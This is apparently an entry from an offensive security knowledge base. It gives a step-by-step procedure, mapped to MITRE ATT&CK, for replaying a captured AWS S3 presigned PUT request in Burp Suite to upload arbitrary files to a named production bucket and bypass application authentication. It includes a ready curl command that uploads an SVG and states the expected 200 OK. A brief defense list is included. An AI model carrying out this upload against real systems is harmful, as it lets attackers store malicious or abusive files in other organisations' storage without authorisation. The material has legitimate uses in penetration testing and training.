---
id: proc-uuid-4
tags:
  - s3-upload
  - presigned-url
  - file-abuse
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/execute-s3-presigned-put]]'
verified: false
platforms:
  - AWS
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.705Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Update-and-Execute-S3-PUT-Upload

## Summary

This procedure updates a captured S3 PUT request with new presigned parameters and executes it to upload arbitrary content directly to the target's AWS S3 bucket.

## Description

Leveraging presigned URLs from the flawed upload initiation, this bypasses app-level auth by directly interacting with S3. It exploits the trust in signed requests, allowing storage of malicious or abusive files in production buckets.

## Requirements

1. Original PUT request from history
2. New AWS parameters from POST response
3. Arbitrary file content (e.g., binary data)

## Defense

Defensive measures and detection strategies:

- Implement S3 bucket policies restricting presigned URL scopes
- Monitor S3 access logs for anomalous PUTs from app-generated keys
- Revoke temporary credentials tied to closed accounts

## Objectives

1. Complete the file upload to S3
2. Demonstrate storage abuse potential
3. Verify bypass of authentication entirely

## Instructions

### Step 1: Locate and Modify PUT Request

**Context**: Prepare the direct upload request.

Send original PUT to Repeater, replace query params with new values (X-Amz-Signature, etc.).

### Step 2: Execute Updated PUT

**Context**: Upload file content to S3.

Execute [[commands/execute-s3-presigned-put]] in Burp:

```bash
# Simulated curl for the PUT
curl -X PUT "https://haystack-production-storage-us-east-1.s3.amazonaws.com/<key>?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=<credential>&X-Amz-Date=<date>&X-Amz-Expires=300&X-Amz-SignedHeaders=content-length%3Bcontent-md5%3Bcontent-type%3Bhost&X-Amz-Signature=<signature>&x-amz-storage-class=INTELLIGENT_TIERING" \
  -H "Content-Type: image/svg+xml" \
  -H "Content-MD5: <base64_md5>" \
  --data-binary @arbitrary_file.svg
```

> Body contains file; expect 200 OK if signature valid.

**Expected Output**: HTTP/1.1 200 OK from S3.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/execute-s3-presigned-put]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- s3-upload
- presigned-url
- file-abuse
